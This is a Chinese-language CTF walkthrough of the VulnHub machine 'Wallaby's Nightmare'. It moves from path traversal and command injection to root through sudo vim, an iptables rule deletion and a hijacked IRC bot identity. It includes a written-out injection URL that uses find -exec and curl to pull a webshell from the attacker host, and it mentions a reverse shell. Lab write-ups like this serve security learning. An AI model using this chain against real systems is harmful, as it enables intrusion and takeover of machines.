---
title: Wallaby's Nightmare Walkthrough
date: 2025-09-27
categories: ['walkthrough','vulnhub']
tags: ['command injection','IRC','irssi']
author: may
description: fuzz -> command injection打点，irssi聊天室机器人提权
image:
  path: ./../assets/images/2025-09-26-Wallaby%27s-Nightmare/cover.png
---

# Recon

这台机器开放标准端口的`ssh`、`web`

![image-20250926135125868](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926135125868.png)

## web

开局一个输入框，要求输入一个`username`

![image-20250926135334099](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926135334099.png)

输入`admin`，下方有一些提示主要告知多尝试`fuzz`，以及注意`tmux`和`environment`

![image-20250926135405181](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926135405181.png)

点击`Start the CTF!`后跳转到了如下页面

![image-20250926135735261](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926135735261.png)

对参数一番`fuzz`，发现无法访问80端口了

重新扫描，发现新增了`60080/tcp`

![image-20250926140225453](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926140225453.png)

访问后是一个静态页面，其中描述了这个端口是迁移过来的

![image-20250926140542776](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926140542776.png)

使用`nikto`扫描，发现存在文件包含

![image-20250926140704598](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926140704598.png)

> 测试小记

- `../../../../../../../etc/passwd` 返回`/etc/passwd`内容
- `php://php://filter/convert.base64-encode/resource=/etc/passwd`也返回`/etc/passwd`内容 而不是base64
- fuzz测试包含任意其它路径都返回`Nice try admin buddy, this vector is patched!`

说明这个位置不是真实的`LFI`，还有测试其他漏洞的余地

![image-20250926164318909](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926164318909.png)

单双引号测试，单引号发现内容返回空白，源代码中发现了有意思的内容

```javascript
<script>window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for firefox and chrome
    var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
    pc.createDataChannel("");    //create a bogus data channel
    pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
    pc.onicecandidate = function(ice){  //listen for candidate events
        if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
        var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
        alert('Your ip is ' + myIP + ', consider it blacklisted for a bit :D.');
        post('/?page=blacklist', {bl: myIP});
        pc.onicecandidate = noop;
    };</script>
```

这是一个`webRTC`实现，用于收集客户端IP地址，并发送到服务器

其中发现了`/?page=blacklist`，尝试访问，测试一番无果

![image-20250926165346163](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926165346163.png)

进一步fuzz page参数，发现`mailer`

![image-20250926175332037](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926175332037.png)

访问`?page=mailer`后查看源代码，其中包含了一个路径，访问返回`Coming Soon guys!`

![image-20250926175402143](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926175402143.png)

尝试fuzz mail参数，发现能执行一些命令

![image-20250926175703223](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926175703223.png)

# bypass a limit www-data shell

试图绕过这个受限shell，使用`find`命令执行

![image-20250926175749197](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926175749197.png)小马拉大马，先用find逃逸`lshell`执行curl落地小马

http://192.168.2.122:60080/?page=mailer&mail=find%20.%20-exec%20curl%20http://192.168.2.100:8000/muma.php%20%3El.php\;

![image-20250926183336489](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926183336489.png)

可以使用shell管理工具上传reverse.php，也可以直接curl落地反弹

![image-20250926183601452](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250926183601452.png)

# shell as waldo by sudo-vim

例行检查，发现能以`waldo`权限执行`vim /etc/apache2/sites-available/000-default.conf`

那么提权即可

![image-20250927115138008](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927115138008.png)

发现`/home/waldo/irssi.sh`，其中使用tmux创建了`irssi`会话

![image-20250927115403817](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927115403817.png)

`tmux attach`查看，这是一个使用`IRC`协议的客户端`irssi`，本质上是一个古老的命令行聊天室，使用`tcp/6667`端口

![image-20250927115339021](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927115339021.png)

但是前期nmap扫描显示`tcp/6667`端口状态是`filtered`

`www-data`执行`sudo -l`会看到能以root权限执行`iptables`，那么使用`sudo iptables -D INPUT 2`手动清除这条规则

![image-20250927115806087](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927115806087.png)

再次扫描验证`6667`端口已开放

![image-20250927120035803](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927120035803.png)

# shell as root by irssi

kali中`apt install irssi`安装客户端，使用`irssi -c 192.168.2.122`连接聊天室

![image-20250927120336327](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927120336327.png)

使用`/list`列出聊天室，得到`#wallabyschat`，使用`/join #wallabyschat`加入聊天室

在这个聊天室看到存在`waldo`和`wallabysbot`

![image-20250927195330863](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927195330863.png)

`/leave`离开聊天室，执行`/whois wallabysbot`，能发现他是一个`Bot`，它基于`Sopel`

![image-20250927200011838](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927200011838.png)

来到`/hoe/wallaby/.sopel/modules/`目录，查看`run.py`，它作为一个模块被使用，其中定义了`run`函数用于执行命令

![image-20250927202158914](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927202158914.png)

尝试在聊天室中执行，发现回显`Hold on, you aren't Waldo?`

没有权限执行，因为连接到聊天室的身份不是`Waldo`

![image-20250927202323901](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927202323901.png)

现在需要想办法获得`waldo`的聊天室身份，在上文中已经知道`waldo`用户使用`tmux`创建了连接到聊天室的会话

`ps -ef|grep tmux`得到`tmux pid`，然后`kill`掉进程，让`waldo`聊天室身份断线

![image-20250927203035963](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927203035963.png)

![image-20250927203449119](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927203449119.png)

此时使用`/nick Waldo`接管身份，尝试执行命令发现执行成功

![image-20250927203547343](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927203547343.png)

反弹shell得到`wallaby`用户权限

![image-20250927203724170](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927203724170.png)

存在于`/etc/sudoers`中，可以直接`sudo su`完成提权

![image-20250927203831180](./../assets/images/2025-09-26-Wallaby%27s-Nightmare/image-20250927203831180.png)